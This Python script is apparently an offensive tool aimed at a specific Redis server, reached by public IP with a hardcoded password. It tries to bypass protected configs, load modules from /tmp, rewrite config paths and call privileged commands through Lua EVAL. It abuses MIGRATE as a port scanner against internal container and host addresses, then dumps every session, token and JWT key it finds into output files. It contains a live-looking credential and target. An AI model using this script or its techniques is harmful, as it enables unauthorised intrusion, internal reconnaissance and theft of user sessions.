import json,socket,time,ssl,urllib.request,sys,traceback
OUT=[]
def log(s):
    print(s,flush=True); OUT.append(str(s))
class R:
    def __init__(s,host,port,pw,to=10):
        s.s=socket.create_connection((host,port),to); s.s.settimeout(to); s.buf=b""
        if pw: s.cmd("AUTH",pw)
    def _fill(s):
        c=s.s.recv(65536)
        if not c: raise IOError("closed")
        s.buf+=c
    def _parse(s):
        while True:
            if not s.buf: s._fill()
            t=s.buf[:1]; nl=s.buf.find(b"\r\n")
            if t in (b"+",b"-",b":"):
                if nl<0: s._fill(); continue
                line=s.buf[1:nl]; s.buf=s.buf[nl+2:]
                if t==b"-": return {"err":line.decode('utf-8','replace')}
                return line.decode('utf-8','replace')
            if t==b"$":
                while nl<0: s._fill(); nl=s.buf.find(b"\r\n")
                n=int(s.buf[1:nl]); s.buf=s.buf[nl+2:]
                while len(s.buf)<n+2: s._fill()
                d=s.buf[:n]; s.buf=s.buf[n+2:]
                return d.decode('utf-8','replace')
            if t==b"*":
                while nl<0: s._fill(); nl=s.buf.find(b"\r\n")
                n=int(s.buf[1:nl]); s.buf=s.buf[nl+2:]
                return [s._parse() for _ in range(n)]
            return "?"+repr(s.buf[:60])
    def cmd(s,*a):
        rq=b"*%d\r\n"%len(a)
        for x in a:
            x=x if isinstance(x,bytes) else str(x).encode()
            rq+=b"$%d\r\n"%len(x)+x+b"\r\n"
        s.s.sendall(rq); return s._parse()
    def close(s):
        try: s.s.close()
        except: pass
def main():
    log("== RUNNER %s utc=%s egress=%s"%(socket.gethostname(),time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),urllib.request.urlopen("https://ifconfig.me/ip",timeout=8).read().decode()))
    r=R("103.40.14.130",6379,"4GRZhjQ4xhdfNXG4",10)
    log("AUTH ok")
    tests=[("CONFIG","SET","enable-protected-configs","yes"),
           ("CONFIG","SET","enable-protected-configs","no"),
           ("MODULE","LOAD","/tmp/x734.so"),
           ("MODULE","LOAD","/usr/local/lib/redis/modules/redisearch.so"),
           ("ACL","SAVE"),
           ("CONFIG","REWRITE"),
           ("CONFIG","SET","logfile","/data/zz734.log"),
           ("CONFIG","SET","requirepass","4GRZhjQ4xhdfNXG4"),
           ("EVAL","return redis.call('config','set','dir','/tmp')",0),
           ("EVAL","local ok,e=pcall(function() return redis.call('module','load','/tmp/x.so') end) return tostring(ok)..':'..tostring(e)",0),
           ("EVAL","if redis.call('get','x')==nil then return 1 end return 0",0)]
    for t in tests:
        try: log("  %s -> %r"%(" ".join(t[:3]), str(r.cmd(*t))[:400]))
        except Exception as e: log("  %s EXC %s"%(" ".join(t[:3]),e))
    # dump protected config list check: try dir via CONFIG REWRITE file write then
    try:
        log("  DEBUG JMAP -> %r"%str(r.cmd("DEBUG","JMAP"))[:200])
    except Exception as e: log("  debug exc %s"%e)
    # MIGRATE as TCP probe from redis container netns
    log("== MIGRATE probes (tcp connect oracle from container 172.18.0.5) ==")
    r.cmd("SET","zz734probe","v")
    r.cmd("EXPIRE","zz734probe",60)
    targets=[("127.0.0.1",32311),("172.18.0.1",32311),("172.18.0.1",24678),("172.18.0.1",5278),("172.18.0.1",22),("172.18.0.1",6379),("172.18.0.1",3101),("172.18.0.1",5215),("172.18.0.7",6379),("103.40.14.130",32311),("172.17.0.1",32311)]
    for h,p in targets:
        t0=time.time()
        try:
            res=r.cmd("MIGRATE",h,p,"zz734probe","0","1500")
            log("  %s:%d -> %r dt=%.2f"%(h,p,str(res)[:120],time.time()-t0))
        except Exception as e:
            log("  %s:%d EXC %s"%(h,p,e))
    try: r.cmd("DEL","zz734probe")
    except Exception: pass
    # dump sessions & configs key
    log("== selected keys ==")
    for k in ("configs",):
        try: log("  %s type=%s val=%r"%(k,r.cmd("TYPE",k),str(r.cmd("GET",k) if r.cmd("TYPE",k)=="string" else r.cmd("HGETALL",k))[:1500]))
        except Exception as e: log("  %s err %s"%(k,e))
    ks=r.cmd("KEYS","*")
    sk=[k for k in ks if 'session' in k or 'token' in k.lower() or 'jwt' in k.lower()]
    log("session-like keys n=%d"%len(sk))
    for k in sk:
        try:
            t=r.cmd("TYPE",k)
            if t=="string": v=r.cmd("GET",k)
            elif t=="hash": v=r.cmd("HGETALL",k)
            else: v=r.cmd("LRANGE",k,"0","5") if t=="list" else t
            log("  K %s type=%s ttl=%s val=%r"%(k,t,r.cmd("TTL",k),str(v)[:600]))
        except Exception as e: log("  K %s err %s"%(k,e))
    r.close()
    blob="\n".join(OUT); open("zz-734b-result.txt","w").write(blob)
    for i in range(0,len(blob),30000): open("zz-734b-part%d.txt"%(i//30000),"w").write(blob[i:i+30000])
    log("PARTS %d"%(len(blob)//30000+1))
try: main()
except Exception:
    print(traceback.format_exc()); open("zz-734b-result.txt","w").write("\n".join(OUT)+"\n"+traceback.format_exc())
